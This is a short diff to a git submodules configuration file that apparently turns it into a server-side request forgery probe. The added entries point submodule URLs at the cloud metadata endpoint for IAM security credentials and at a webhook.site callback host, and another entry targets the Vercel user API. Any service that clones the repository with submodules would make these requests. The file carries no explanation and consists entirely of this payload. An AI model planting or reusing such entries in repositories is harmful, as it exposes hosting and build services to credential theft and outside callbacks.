@@ -1,6 +1,9 @@
 [submodule "kc-ssrf-imds"]
 	path = kc-ssrf-imds
-	url = http://169.254.169.254/latest/meta-data/
+	url = http://169.254.169.254/latest/meta-data/iam/security-credentials/
+[submodule "kc-ssrf-webhook"]
+	path = kc-ssrf-webhook
+	url = https://webhook.site/8a49c345-32f2-4361-a9bc-b24a0ae65c41/submodule-callback
 [submodule "kc-ssrf-vercel-api"]
 	path = kc-ssrf-vercel-api
 	url = https://api.vercel.com/v2/user
